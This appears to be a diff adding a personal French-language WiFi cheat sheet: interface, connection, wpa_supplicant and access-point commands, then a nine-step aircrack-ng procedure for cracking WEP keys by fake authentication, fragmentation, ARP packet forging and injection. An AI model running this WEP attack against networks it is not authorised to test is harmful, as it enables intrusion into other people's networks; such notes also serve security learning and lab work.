@@ -1,0 +1,101 @@
+=======================
+██     ██ ██ ███████ ██ 
+██     ██ ██ ██      ██ 
+██  █  ██ ██ █████   ██ 
+██ ███ ██ ██ ██      ██ 
+ ███ ███  ██ ██      ██ 
+=======================
+
+=======================
+[NETWORK]
+=======================
+
+nmcli dev wifi
+
+sudo airodump-ng InterfaceName
+
+=======================
+[INTERFACE]
+=======================
+
+[ENABLE]
+
+ifconfig wlp3s0 up
+
+[DISABLE]
+
+ifconfig wlp3s0 down
+
+[DETECT]
+
+ls /sys/class/net
+
+iwlist scan
+iwlist scan | grep ESSID
+
+[CONNECT]
+
+nmcli d wifi connect MonReseau password SonPassWord
+
+nmtui
+
+[AUTO AUTHENTIFICATION]
+
+sudo nano /etc/wpa_supplicant/wpa_supplicant.conf
+
+==============================================================
+country=FR
+    ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
+    update_config=1
+
+    network={
+    ssid="NOM2WIFI"
+    psk="MDPWIFI"
+    key_mgmt=WPA-PSK
+}
+==============================================================
+
+[ACCESS-POINT]
+
+sudo apt install lnxrouter
+sudo lnxrouter --ap wlan0 NomPointAcces -p MotDePasse
+
+[WEP]
+
+[1]passer la carte en moniteur
+    airmon-ng start wlan0
+
+[2]Scan des réseaux disponibles
+
+    airodump-ng --encrypt wep mon0
+
+[3]Focus sur une réseau
+    airodump-ng --bssid [adresse du réseau] --ch [n° du canal] --write keyvala mon0
+
+[4]Fausser une connection avec la box
+    aireplay-ng --fakeauth 30 -a [adresse du réseau] mon0
+    (cette commande doit tourner en continue)
+
+[5]Générer un paquet XOR
+    aireplay-ng --fragment -b [addresse du réseau] -r keyvala-01.cap mon0
+    (vérification que le BSSID correspond ) 
+    [noter le BSSID "source mac" ==> 'yes' ]
+
+[6]GOT RELAYED PACKET!!
+    (noter le nom du fichier.xor)
+
+[7]Forger un paquet ARP
+    packetforge-ng --arp -a [adresse du réseau] -h [source mac] -k 192.168.0.10 -l 192.168.0.254 -y [fichier.xor] -w arp
+
+[8]Injecter le paquet
+    aireplay-ng --arpreplay -b [adresse du reseau] -r arp mon0
+
+[9]Cracker la clef
+    airecrack-ng WEPkey-01.cap
+
+[SOLUTION]
+    les [] sont à enlever
+    Ajouter --ignore-negative-one devant l'interface mon0 si celle ci pose probléme
+    4-> mauvaise connection , rapprochez vous pour améliorer le signal // filtrage d'adresse mac de la box 
+    6-> il faut parfois faire plusieurs tentatives 
+    8-> attendre d'avoir un nombre de paquet conséquent pour pouvoir lancer le crackage
